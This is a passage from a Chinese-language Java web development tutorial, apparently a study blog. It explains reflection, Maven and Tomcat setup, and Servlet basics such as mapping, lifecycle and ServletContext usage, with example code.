c.getDeclaredFields();<span class="comment">//获取声明了的成员变量的信息</span></span><br><span class="line">    <span class="keyword">for</span> (Field field : fs) &#123;</span><br><span class="line">        <span class="comment">//得到成员变量的类类型</span></span><br><span class="line">        <span class="type">Class</span> <span class="variable">fieldType</span> <span class="operator">=</span> field.getClass();</span><br><span class="line">        <span class="type">String</span> <span class="variable">typeName</span> <span class="operator">=</span> fieldType.getName();</span><br><span class="line">        <span class="type">String</span> <span class="variable">fieldName</span> <span class="operator">=</span> field.getName();</span><br><span class="line">        System.out.println(<span class="string">&quot;typename:&quot;</span> + typeName + <span class="string">&quot;  fieldName:&quot;</span> + fieldName);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">/**</span></span><br><span class="line"><span class="comment"> * 输出类的构造函数的信息</span></span><br><span class="line"><span class="comment"> * 构造函数</span></span><br><span class="line"><span class="comment"> * <span class="doctag">@param</span> obj</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">printConMessage</span><span class="params">(Object obj)</span>&#123;</span><br><span class="line">    Class&lt;?&gt; c = obj.getClass();</span><br><span class="line">    Constructor[] constructors = c.getDeclaredConstructors();</span><br><span class="line">    <span class="keyword">for</span> (Constructor constructor1: constructors</span><br><span class="line">         ) &#123;</span><br><span class="line">        <span class="type">String</span> <span class="variable">constructor1Name</span> <span class="operator">=</span> constructor1.getName();</span><br><span class="line">        System.out.print(constructor1Name+<span class="string">&quot;(&quot;</span>);</span><br><span class="line">        <span class="comment">//获取构造函数的参数列表</span></span><br><span class="line">        Class[] parameterTypes = constructor1.getParameterTypes();</span><br><span class="line">        <span class="keyword">for</span> (Class class1:parameterTypes</span><br><span class="line">             ) &#123;</span><br><span class="line">            System.out.print(class1.getName()+<span class="string">&quot;,&quot;</span>);</span><br><span class="line">        &#125;</span><br><span class="line">        System.out.println(<span class="string">&quot;)&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<h3 id="方法反射的基本操作"><a href="#方法反射的基本操作" class="headerlink" title="方法反射的基本操作"></a>方法反射的基本操作</h3><ul>
<li><p>如何获取某个方法</p>
<p>方法的<strong>名称</strong>和方法的<strong>参数列表</strong>，才能唯一决定某个方法</p>
</li>
<li><p>如何方法反射的操作</p>
<p>method.invoke(对象，参数列表)</p>
</li>
</ul>
<p>TestMehod类：</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">class</span> <span class="title class_">TestMehod</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">print</span><span class="params">(<span class="type">int</span> a,<span class="type">int</span> b)</span>&#123;</span><br><span class="line">        System.out.println(a+b);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">print</span><span class="params">(String a,String b)</span>&#123;</span><br><span class="line">        System.out.println(a.toUpperCase()+b);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>获取一个方法，首先要获取<strong>类的信息</strong></p>
<p>获取类的信息先要获取类的参数列表</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="type">TestMehod</span> <span class="variable">test</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">TestMehod</span>();</span><br><span class="line"><span class="type">Class</span> <span class="variable">aClass</span> <span class="operator">=</span> test.getClass();</span><br><span class="line"><span class="comment">//获取到TestMehod类的信息</span></span><br></pre></td></tr></table></figure>

<p>获取方法，要求方法名和参数列表</p>
<p>getMethod获取到public的方法，getDeclaredMethod获取到声明了的方法</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line">/        aClass.getMethod(<span class="string">&quot;print&quot;</span>, <span class="type">int</span>.class, <span class="type">int</span>.class)</span><br><span class="line"><span class="comment">//        aClass.getMethod(&quot;print&quot;,new Class[]&#123;int.class,int.class&#125;);</span></span><br><span class="line">        <span class="type">Method</span> <span class="variable">m</span> <span class="operator">=</span> aClass.getDeclaredMethod(<span class="string">&quot;print&quot;</span>, <span class="type">int</span>.class, <span class="type">int</span>.class);</span><br></pre></td></tr></table></figure>

<p>然后通过获取到的方法，来进行方法调用</p>
<p>也就是方法的反射操作，反过来通过操作test对象来调用方法</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="comment">//            Object o = m.invoke(test, new Object[]&#123;1, 2&#125;);</span></span><br><span class="line">            <span class="type">Object</span> <span class="variable">o2</span> <span class="operator">=</span> m.invoke(test, <span class="number">1</span>, <span class="number">2</span>);</span><br><span class="line"><span class="comment">//等效于test.print()</span></span><br></pre></td></tr></table></figure>

<p>同样：</p>
<p>等价于test.print(“hello”,”WORLD”);</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="comment">//通过String.class来获取到想要的另一个方法类型</span></span><br><span class="line"><span class="type">Method</span> <span class="variable">m2</span> <span class="operator">=</span> aClass.getMethod(<span class="string">&quot;print&quot;</span>, String.class, String.class);</span><br><span class="line"><span class="comment">//通过方法来反射操作</span></span><br><span class="line"><span class="type">Object</span> <span class="variable">o2</span> <span class="operator">=</span> m2.invoke(test, <span class="string">&quot;hello&quot;</span>, <span class="string">&quot;WORLD&quot;</span>);</span><br></pre></td></tr></table></figure>

<p>如果想要获取的方法没有参数可以这样写</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="type">Method</span> <span class="variable">m3</span> <span class="operator">=</span> aClass.getMethod(<span class="string">&quot;print&quot;</span>,<span class="keyword">new</span> <span class="title class_">Class</span>[]&#123;&#125;);</span><br><span class="line"><span class="type">Method</span> <span class="variable">m3</span> <span class="operator">=</span> aClass.getMethod(<span class="string">&quot;print&quot;</span>);</span><br></pre></td></tr></table></figure>

<h3 id="通过反射来了解泛型的本质"><a href="#通过反射来了解泛型的本质" class="headerlink" title="通过反射来了解泛型的本质"></a>通过反射来了解泛型的本质</h3><p>通过Class，Method来了解泛型的本质</p>
<p>之前我们使用集合：</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="comment">//集合操作</span></span><br><span class="line">        <span class="type">ArrayList</span> <span class="variable">list</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ArrayList</span>();<span class="comment">//任何类型</span></span><br><span class="line">        ArrayList&lt;String&gt; list1 = <span class="keyword">new</span> <span class="title class_">ArrayList</span>&lt;&gt;();<span class="comment">//只能放String类型</span></span><br></pre></td></tr></table></figure>

<p>其实，之前所说的类类型，也可以叫做字节码</p>
<p>因为反射的操作都是编译之后的操作</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="type">Class</span> <span class="variable">c1</span> <span class="operator">=</span> list.getClass();</span><br><span class="line"><span class="type">Class</span> <span class="variable">c2</span> <span class="operator">=</span> list1.getClass();</span><br><span class="line">System.out.println(c1==c2);<span class="comment">//true,说明编译之后集合是去泛型化的</span></span><br></pre></td></tr></table></figure>

<p>所以java中，集合的泛型是防止错误输入的，只在编译阶段有效</p>
<p>编译之后泛型就无效了</p>
<p>我们可以通过方法的反射来操作，<strong>绕过泛型的限制</strong></p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line">        <span class="type">Method</span> <span class="variable">add</span> <span class="operator">=</span> c1.getMethod(<span class="string">&quot;add&quot;</span>, Object.class);</span><br><span class="line">        add.invoke(list1,<span class="number">100</span>);</span><br><span class="line"><span class="comment">//原先是加不进去的</span></span><br><span class="line">        System.out.println(list1.toString());</span><br></pre></td></tr></table></figure>

<p>反射的操作，一系列操作都是绕过编译，在运行时刻执行的。</p>
<h2 id="什么是反射"><a href="#什么是反射" class="headerlink" title="什么是反射"></a>什么是反射</h2><p>（1）Java反射机制的核心是在<strong>程序运行时动态加载类并获取类的详细信息</strong>（此时已经编译后），从而<strong>操作类或对象的属性和方法</strong>。本质是<strong>JVM得到class对象之后，再通过class对象进行反编译，从而获取对象的各种信息。</strong></p>
<p>（2）Java属于先编译再运行的语言，程序中对象的类型在编译期就确定下来了，而当程序在运行时可能需要动态加载某些类，这些类因为之前用不到，所以没有被加载到JVM。通过反射，可以在运行时动态地创建对象并调用其属性，不需要提前在编译期知道运行的对象是谁。</p>
<h2 id="反射的原理"><a href="#反射的原理" class="headerlink" title="反射的原理"></a>反射的原理</h2><p>下图是类的正常加载过程、反射原理与class对象：</p>
<p>Class对象的由来是将**.class文件读入内存，并为之创建一个Class对象。**</p>
<p><a href="https://www.wailian.work/image/QUaeEI"><img src="https://o.130014.xyz/2022/03/03/image-20220301223149-1sjhfyl.png" alt="image-20220301223149-1sjhfyl.png"></a></p>
<h2 id="反射的优缺点"><a href="#反射的优缺点" class="headerlink" title="反射的优缺点"></a>反射的优缺点</h2><p>1、优点：在运行时获得类的各种内容，进行反编译，对于Java这种先编译再运行的语言，能够让我们很方便的创建灵活的代码，这些代码可以在运行时装配，无需在组件之间进行源代码的链接，更加容易实现面向对象。</p>
<p>2、缺点：</p>
<p>（1）反射会消耗一定的系统资源，因此，如果不需要动态地创建一个对象，那么就不需要用反射；</p>
<p>（2）反射调用方法时可以忽略权限检查，因此可能会破坏封装性而导致安全问题。</p>
<h2 id="反射的用途"><a href="#反射的用途" class="headerlink" title="反射的用途"></a>反射的用途</h2><p>1、反编译：.class–&gt;.java</p>
<p>2、通过反射机制访问java对象的属性，方法，构造方法等</p>
<p>3、当我们在使用IDE,比如Ecplise时，当我们输入一个对象或者类，并想调用他的属性和方法是，一按点号，编译器就会自动列出他的属性或者方法，这里就是用到反射。</p>
<p>4、反射最重要的用途就是开发各种通用框架。比如很多框架（Spring）都是配置化的（比如通过XML文件配置Bean），为了保证框架的通用性，他们可能需要根据配置文件加载不同的类或者对象，调用不同的方法，这个时候就必须使用到反射了，运行时动态加载需要的加载的对象。</p>
<p>5、例如，在使用Strut2框架的开发过程中，我们一般会在struts.xml里去配置Action，比如</p>
<figure class="highlight xml"><table><tr><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">action</span> <span class="attr">name</span>=<span class="string">&quot;login&quot;</span> <span class="attr">class</span>=<span class="string">&quot;org.ScZyhSoft.test.action.SimpleLoginAction&quot;</span> <span class="attr">method</span>=<span class="string">&quot;execute&quot;</span>&gt;</span>   </span><br><span class="line">    <span class="tag">&lt;<span class="name">result</span>&gt;</span>/shop/shop-index.jsp<span class="tag">&lt;/<span class="name">result</span>&gt;</span>       </span><br><span class="line">    <span class="tag">&lt;<span class="name">result</span> <span class="attr">name</span>=<span class="string">&quot;error&quot;</span>&gt;</span>login.jsp<span class="tag">&lt;/<span class="name">result</span>&gt;</span>   </span><br><span class="line"><span class="tag">&lt;/<span class="name">action</span>&gt;</span></span><br></pre></td></tr></table></figure>

<p>比如我们请求login.action时，那么StrutsPrepareAndExecuteFilter就会去解析struts.xml文件，<strong>从action中查找出name为login的Action</strong>，并根据class属性创建SimpleLoginAction实例，并用Invoke方法来调用execute方法，这个过程离不开反射。配置文件与Action建立了一种映射关系，当View层发出请求时，请求会被StrutsPrepareAndExecuteFilter拦截，然后StrutsPrepareAndExecuteFilter会去动态地创建Action实例。</p>
<p>比如，加载数据库驱动的，用到的也是反射。</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line">Class.<span class="title function_ invoke__">forName</span>(<span class="string">&quot;com.mysql.jdbc.Driver&quot;</span>); <span class="comment">// 动态加载mysql驱动</span></span><br></pre></td></tr></table></figure>

<h2 id="反射机制常用的类"><a href="#反射机制常用的类" class="headerlink" title="反射机制常用的类"></a>反射机制常用的类</h2><p>Java.lang.Class;</p>
<p>Java.lang.reflect.Constructor;</p>
<p>Java.lang.reflect.Field;</p>
<p>Java.lang.reflect.Method;</p>
<p>Java.lang.reflect.Modifier;</p>
<h1 id="Tomcat"><a href="#Tomcat" class="headerlink" title="Tomcat"></a>Tomcat</h1><p>tomcat目录结构：<a href="https://www.jianshu.com/p/81ec9c51435e">https://www.jianshu.com/p/81ec9c51435e</a></p>
<p>tomcat配置文件详解：<a href="https://www.cnblogs.com/54chensongxia/p/13255055.html">https://www.cnblogs.com/54chensongxia/p/13255055.html</a></p>
<p>tomcat目录结构及配置文件：<a href="https://blog.51cto.com/botao/72331">https://blog.51cto.com/botao/72331</a></p>
<h1 id="Maven"><a href="#Maven" class="headerlink" title="Maven"></a>Maven</h1><p>在javaweb开发中，需要使用大量的jar包，这些jar包需要我们手动导入，一般在lib文件夹下，</p>
<p>Maven是一个架构管理工具</p>
<p>Maven的核心思想：<strong>约定大于配置</strong></p>
<p>配置环境变量，换源</p>
<figure class="highlight xml"><table><tr><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">mirror</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">id</span>&gt;</span>nexus-aliyun<span class="tag">&lt;/<span class="name">id</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">mirrorOf</span>&gt;</span>central<span class="tag">&lt;/<span class="name">mirrorOf</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">name</span>&gt;</span>Nexus aliyun<span class="tag">&lt;/<span class="name">name</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">url</span>&gt;</span>http://maven.aliyun.com/nexus/content/groups/public<span class="tag">&lt;/<span class="name">url</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">mirror</span>&gt;</span></span><br></pre></td></tr></table></figure>

<p>建立一个本地仓库</p>
<figure class="highlight xml"><table><tr><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">localRepository</span>&gt;</span>C:\JAVA\apache-maven-3.8.4\maven-repo<span class="tag">&lt;/<span class="name">localRepository</span>&gt;</span></span><br></pre></td></tr></table></figure>

<p>在idea中配置maven</p>
<p><img src="https://o.130014.xyz/2022/03/03/image-20220302113634-tlpkydk.png" alt="image-20220302113634-tlpkydk.png"></p>
<p><a href="https://www.wailian.work/image/QUaxNS"><img src="https://o.130014.xyz/2022/03/03/image-20220302114323-7karkv2.png" alt="image-20220302114323-7karkv2.png"></a></p>
<p>idea项目创建成功之后，看一眼配置，确认maven配置在自己本地的目录下面</p>
<p>配置tomcat解释器</p>
<p><img src="https://o.130014.xyz/2022/03/03/image-20220302115549-w2fq3xv.png" alt="image-20220302115549-w2fq3xv.png"></p>
<p>虚拟路径映射</p>
<p><img src="https://o.130014.xyz/2022/03/03/image-20220302120012-4zrxqrw.png" alt="image-20220302120012-4zrxqrw.png"></p>
<h2 id="pom-xml"><a href="#pom-xml" class="headerlink" title="pom.xml"></a>pom.xml</h2><p>maven之pom.xml配置文件详解<a href="https://www.jianshu.com/p/0e3a1f9c9ce7">https://www.jianshu.com/p/0e3a1f9c9ce7</a></p>
<h2 id="远程仓库"><a href="#远程仓库" class="headerlink" title="远程仓库"></a>远程仓库</h2><p><a href="https://mvnrepository.com/">https://mvnrepository.com/</a></p>
<h1 id="Servlet"><a href="#Servlet" class="headerlink" title="Servlet"></a>Servlet</h1><h2 id="第一个Servlet"><a href="#第一个Servlet" class="headerlink" title="第一个Servlet"></a>第一个Servlet</h2><p>servlet是sun公司开发动态web的一门技术</p>
<ul>
<li>编写一个类，实现servlet接口</li>
<li>把开发好的Java类部署到web服务器中</li>
</ul>
<h3 id="添加依赖"><a href="#添加依赖" class="headerlink" title="添加依赖"></a>添加依赖</h3><h3 id="HelloServlet"><a href="#HelloServlet" class="headerlink" title="HelloServlet"></a>HelloServlet</h3><p>创建一个普通的Maven项目，删掉里面的src目录，之后直接建立模块，这个空工程就是Maven主工程</p>
<p>关于Maven父子工程的理解</p>
<h3 id="maven环境优化"><a href="#maven环境优化" class="headerlink" title="maven环境优化"></a>maven环境优化</h3><p>1.修改web.xml为最新的</p>
<p>2.将maven结构完整</p>
<p><img src="https://o.130014.xyz/2022/03/03/image-20220302142601-vx3r0vj.png" alt="image-20220302142601-vx3r0vj.png"></p>
<h3 id="编写一个Servlet程序"><a href="#编写一个Servlet程序" class="headerlink" title="编写一个Servlet程序"></a>编写一个Servlet程序</h3><ul>
<li>编写一个普通类</li>
<li>实现Servlet接口</li>
</ul>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">HelloServlet</span> <span class="keyword">extends</span> <span class="title class_">HttpServlet</span> &#123;</span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="keyword">protected</span> <span class="keyword">void</span> <span class="title function_">doGet</span><span class="params">(HttpServletRequest req, HttpServletResponse resp)</span> <span class="keyword">throws</span> ServletException, IOException &#123;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">        <span class="comment">//        ServletOutputStream outputStream = resp.getOutputStream();</span></span><br><span class="line">        <span class="type">PrintWriter</span> <span class="variable">writer</span> <span class="operator">=</span> resp.getWriter();<span class="comment">//响应流</span></span><br><span class="line">        writer.print(<span class="string">&quot;Hello Servlet&quot;</span>);</span><br><span class="line"></span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="keyword">protected</span> <span class="keyword">void</span> <span class="title function_">doPost</span><span class="params">(HttpServletRequest req, HttpServletResponse resp)</span> <span class="keyword">throws</span> ServletException, IOException &#123;</span><br><span class="line">        <span class="built_in">super</span>.doGet(req, resp);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<h3 id="编写Servlet的映射"><a href="#编写Servlet的映射" class="headerlink" title="编写Servlet的映射"></a>编写Servlet的映射</h3><p>我们写的是java程序，但是需要通过浏览器访问，而浏览器需要连接web服务器，所以我们要在web服务中注册我们写的Servlet</p>
<p>还要给他一个浏览器能够访问的路径</p>
<p>注册Servlet：</p>
<p>src&#x2F;main&#x2F;webapp&#x2F;WEB-INF&#x2F;web.xml</p>
<figure class="highlight xml"><table><tr><td class="code"><pre><span class="line"><span class="comment">&lt;!--注册Servlet --&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">servlet</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">servlet-name</span>&gt;</span>hello<span class="tag">&lt;/<span class="name">servlet-name</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">servlet-class</span>&gt;</span>com.kuang.servlet.HelloServlet<span class="tag">&lt;/<span class="name">servlet-class</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">servlet</span>&gt;</span></span><br><span class="line"><span class="comment">&lt;!--Servlet的请求路径--&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">servlet-mapping</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">servlet-name</span>&gt;</span>hello<span class="tag">&lt;/<span class="name">servlet-name</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">url-pattern</span>&gt;</span>/hello<span class="tag">&lt;/<span class="name">url-pattern</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">servlet-mapping</span>&gt;</span></span><br></pre></td></tr></table></figure>


<h3 id="配置Tomcat"><a href="#配置Tomcat" class="headerlink" title="配置Tomcat"></a>配置Tomcat</h3><p><img src="https://o.130014.xyz/2022/03/03/image-20220302172025-ari1pa8.png" alt="image-20220302172025-ari1pa8.png"></p>
<p>发布路径</p>
<p><img src="https://o.130014.xyz/2022/03/03/image-20220302171335-7b2r7uj.png" alt="image-20220302171335-7b2r7uj.png"></p>
<p>编译之后发布的网站目录</p>
<p><img src="https://o.130014.xyz/2022/03/03/image-20220302172225-s7miesw.png" alt="image-20220302172225-s7miesw.png"></p>
<p><img src="https://o.130014.xyz/2022/03/03/image-20220302172528-yx480ef.png" alt="image-20220302172528-yx480ef.png"></p>
<h2 id="Servlet原理"><a href="#Servlet原理" class="headerlink" title="Servlet原理"></a>Servlet原理</h2><h3 id="Servlet体系结构"><a href="#Servlet体系结构" class="headerlink" title="Servlet体系结构"></a>Servlet体系结构</h3><p><img src="https://o.130014.xyz/2022/03/03/image-20220302174114-1z0k2mo.png" alt="image-20220302174114-1z0k2mo.png"></p>
<p>Servlet的框架是由两个Java包组成的：javax.servlet与javax.servlet.http。</p>
<p>在javax.servlet包中定义了所有的Servlet类都必须实现或者扩展的通用接口和类。</p>
<p>在javax.servlet.http包中定义了采用Http协议通信的HttpServlet类。</p>
<p>Servlet的框架的核心是javax.servlet.Servlet接口，所有的Servlet都必须实现这个接口。</p>
<p><img src="https://o.130014.xyz/2022/03/03/image-20220302174428-d0konpg.png" alt="image-20220302174428-d0konpg.png"></p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="number">1.</span> init(ServletConfig)方法：负责初始化Servlet对象，在Servlet的生命周期中，该方法执行一次；该方法执行在单线程的环境下，因此开发者不用考虑线程安全的问题；</span><br><span class="line"><span class="number">2.</span> service(ServletRequest req,ServletResponse res)方法：负责响应客户的请求；为了提高效率，Servlet规范要求一个Servlet实例必须能够同时服务于多个客户端请求，即service()方法运行在多线程的环境下，Servlet开发者必须保证该方法的线程安全性；</span><br><span class="line"><span class="number">3.</span> destroy()方法：当Servlet对象退出生命周期时，负责释放占用的资源；</span><br><span class="line"><span class="number">4.</span> getServletInfo：就是字面意思，返回Servlet的描述；</span><br><span class="line"><span class="number">5.</span> getServletConfig：这个方法返回由Servlet容器传给init方法的ServletConfig。</span><br></pre></td></tr></table></figure>

<p><strong>ServletRequest &amp; ServletResponse</strong></p>
<p>对于每一个HTTP请求，servlet容器会创建一个封装了HTTP请求的ServletRequest实例传递给servlet的service方法，ServletResponse则表示一个Servlet响应，其隐藏了将响应发给浏览器的复杂性。通过ServletRequest的方法你可以获取一些请求相关的参数，而ServletResponse则可以将设置一些返回参数信息，并且设置返回内容。</p>
<h3 id="Servlet工作原理"><a href="#Servlet工作原理" class="headerlink" title="Servlet工作原理"></a>Servlet工作原理</h3><p>当Web服务器接收到一个HTTP请求时，它会先判断请求内容：</p>
<p>如果是静态网页数据，Web服务器将会自行处理，然后产生响应信息；</p>
<p>如果牵涉到动态数据，Web服务器会将请求转交给<strong>Servlet容器</strong>。此时Servlet容器会找到对应的处理该请求的Servlet实例来处理，结果会送回Web服务器，再由Web服务器传回用户端。</p>
<p><img src="https://o.130014.xyz/2022/03/03/image-20220302193609-s6ivgis.png" alt="image-20220302193609-s6ivgis.png"></p>
<p>接着我们描述一下Tomcat与Servlet是如何工作的，首先看下面的时序图：</p>
<p><img src="https://o.130014.xyz/2022/03/03/image-20220302193656-6lc2zmi.png" alt="image-20220302193656-6lc2zmi.png"></p>
<ul>
<li>Web Client 向Servlet容器（Tomcat）发出Http请求；</li>
<li>Servlet容器接收Web Client的请求；</li>
<li>Servlet容器创建一个HttpRequest对象，将Web Client请求的信息封装到这个对象中；</li>
<li>Servlet容器创建一个HttpResponse对象；</li>
<li>Servlet容器调用HttpServlet对象的service方法，把HttpRequest对象与HttpResponse对象作为参数传给 HttpServlet对象；</li>
<li>HttpServlet调用HttpRequest对象的有关方法，获取Http请求信息；</li>
<li>HttpServlet调用HttpResponse对象的有关方法，生成响应数据；</li>
<li>Servlet容器把HttpServlet的响应结果传给Web Client；</li>
</ul>
<h3 id="Servlet生命周期"><a href="#Servlet生命周期" class="headerlink" title="Servlet生命周期"></a>Servlet生命周期</h3><p><strong>在Servlet接口中定义了5个方法，其中3个方法代表了Servlet的生命周期：</strong></p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="number">1.</span> init(ServletConfig)方法：负责初始化Servlet对象，在Servlet的生命周期中，该方法执行一次；该方法执行在单线程的环境下，因此开发者不用考虑线程安全的问题；</span><br><span class="line"><span class="number">2.</span> service(ServletRequest req,ServletResponse res)方法：负责响应客户的请求；为了提高效率，Servlet规范要求一个Servlet实例必须能够同时服务于多个客户端请求，即service()方法运行在多线程的环境下，Servlet开发者必须保证该方法的线程安全性；</span><br><span class="line"><span class="number">3.</span> destroy()方法：当Servlet对象退出生命周期时，负责释放占用的资源；</span><br></pre></td></tr></table></figure>

<p><img src="https://o.130014.xyz/2022/03/03/image-20220302194002-fsajmvr.png" alt="image-20220302194002-fsajmvr.png"></p>
<h2 id="servlet-mapping的配置与问题"><a href="#servlet-mapping的配置与问题" class="headerlink" title="servlet-mapping的配置与问题"></a>servlet-mapping的配置与问题</h2><p><a href="https://blog.csdn.net/qfikh/article/details/52565976">https://blog.csdn.net/qfikh/article/details/52565976</a></p>
<h2 id="Servlet的详细使用"><a href="#Servlet的详细使用" class="headerlink" title="Servlet的详细使用"></a>Servlet的详细使用</h2><h3 id="ServletContext"><a href="#ServletContext" class="headerlink" title="ServletContext"></a>ServletContext</h3><p><a href="https://blog.csdn.net/gavin_john/article/details/51399425">https://blog.csdn.net/gavin_john&#x2F;article&#x2F;details&#x2F;51399425</a></p>
<p>web容器在启动的时候，他会为每个web程序都创建一个对应的ServletContext对象，它代表了当前的web应用</p>
<p><img src="https://o.130014.xyz/2022/03/03/image-20220302223905-rkr4zwl.png" alt="image-20220302223905-rkr4zwl.png"></p>
<ul>
<li>共享数据</li>
<li>获取初始化参数 <code>context.getInitParameter()</code></li>
<li>请求转发 <code>context.getRequestDispatcher()</code></li>
<li>读取资源文件</li>
</ul>
<h4 id="编写一个ServletContext"><a href="#编写一个ServletContext" class="headerlink" title="编写一个ServletContext"></a>编写一个ServletContext</h4><p>需要一个放置数据的类，需要一个读取的类，然后配置web.xml</p>
<p>编写一个Servlet，获取到ServletContext类，往里面加入一个属性</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">HelloServlet</span> <span class="keyword">extends</span> <span class="title class_">HttpServlet</span> &#123;</span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="keyword">protected</span> <span class="keyword">void</span> <span class="title function_">doGet</span><span class="params">(HttpServletRequest req, HttpServletResponse resp)</span> <span class="keyword">throws</span> ServletException, IOException &#123;</span><br><span class="line">        <span class="type">ServletContext</span> <span class="variable">context</span> <span class="operator">=</span> <span class="built_in">this</span>.getServletContext();</span><br><span class="line"></span><br><span class="line">        <span class="type">String</span> <span class="variable">username</span> <span class="operator">=</span> <span class="string">&quot;admin&quot;</span>;<span class="comment">//数据k</span></span><br><span class="line">        context.setAttribute(<span class="string">&quot;username&quot;</span>,username);<span class="comment">//将一个数据保存在了ServletContext中，名字为username，值username</span></span><br><span class="line"></span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>写另一个类，在其中获取到和上面一样的ServletContext类，在里面取出属性并打印到页面中</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">GetServlet</span> <span class="keyword">extends</span> <span class="title class_">HttpServlet</span> &#123;</span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="keyword">protected</span> <span class="keyword">void</span> <span class="title function_">doGet</span><span class="params">(HttpServletRequest req, HttpServletResponse resp)</span> <span class="keyword">throws</span> ServletException, IOException &#123;</span><br><span class="line">        <span class="type">ServletContext</span> <span class="variable">context</span> <span class="operator">=</span> <span class="built_in">this</span>.getServletContext();</span><br><span class="line">        <span class="type">String</span> <span class="variable">username</span> <span class="operator">=</span> (String) context.getAttribute(<span class="string">&quot;username&quot;</span>);</span><br><span class="line"></span><br><span class="line">        resp.getWriter().println(<span class="string">&quot;username:&quot;</span>+username);</span><br><span class="line"></span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="keyword">protected</span> <span class="keyword">void</span> <span class="title function_">doPost</span><span class="params">(HttpServletRequest req, HttpServletResponse resp)</span> <span class="keyword">throws</span> ServletException, IOException &#123;</span><br><span class="line">        <span class="built_in">super</span>.doGet(req, resp);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>写完之后注册路由</p>
<p><img src="https://o.130014.xyz/2022/03/03/image-20220302225223-a5nhirq.png" alt="image-20220302225223-a5nhirq.png"></p>
<h4 id="读取资源文件"><a href="#读取资源文件" class="headerlink" title="读取资源文件"></a>读取资源文件</h4><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">PropertiesServlet</span> <span class="keyword">extends</span> <span class="title class_">HttpServlet</span> &#123;</span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="keyword">protected</span> <span class="keyword">void</span> <span class="title function_">doGet</span><span class="params">(HttpServletRequest req, HttpServletResponse resp)</span> <span class="keyword">throws</span> ServletException, IOException &#123;</span><br><span class="line"></span><br><span class="line">        <span class="type">InputStream</span> <span class="variable">is</span> <span class="operator">=</span> <span class="built_in">this</span>.getServletContext().getResourceAsStream(<span class="string">&quot;/WEB-INF/classes/db.properties&quot;</span>);</span><br><span class="line"></span><br><span class="line">        <span class="type">Properties</span> <span class="variable">prop</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">Properties</span>();</span><br><span class="line">        prop.load(is);</span><br><span class="line">        <span class="type">String</span> <span class="variable">user</span> <span class="operator">=</span> prop.getProperty(<span class="string">&quot;username&quot;</span>);</span><br><span class="line">        <span class="type">String</span> <span class="variable">pwd</span> <span class="operator">=</span> prop.getProperty(<span class="string">&quot;password&quot;</span>);</span><br><span class="line"></span><br><span class="line">        resp.getWriter().println(<span class="string">&quot;user:&quot;</span>+user+<span class="string">&quot; pwd:&quot;</span>+pwd);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span 